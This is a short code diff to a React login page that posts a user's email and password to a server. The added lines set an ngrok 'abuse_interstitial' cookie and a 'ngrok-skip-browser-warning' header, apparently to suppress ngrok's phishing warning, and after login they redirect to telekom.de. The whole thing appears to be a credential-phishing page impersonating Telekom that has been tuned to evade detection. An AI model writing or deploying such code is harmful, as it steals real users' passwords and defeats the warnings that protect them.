@@ -9,6 +9,8 @@ export default function Home() {
   const [password, setPassword] = useState('');
   const [rememberUsername, setRememberUsername] = useState(false);
   const router = useRouter();
+  document.cookie = "abuse_interstitial=powerful-rare-bee.ngrok-free.app; Secure; SameSite=Strict; path=/";
+
   const handleNext = () => {
     if (username.trim() !== '') {
       setActiveSlide(2);
@@ -26,6 +28,7 @@ export default function Home() {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
+            'ngrok-skip-browser-warning': 'true',
           },
           body: JSON.stringify({ email: username, password }),
         });
@@ -33,6 +36,9 @@ export default function Home() {
         if (!response.ok) {
           throw new Error('Login failed');
         }
+        
+        // Set secure cookie
+
         // redirect to /dashboard
         router.push('/https://telekom.de/');
         console.log('Login successful');
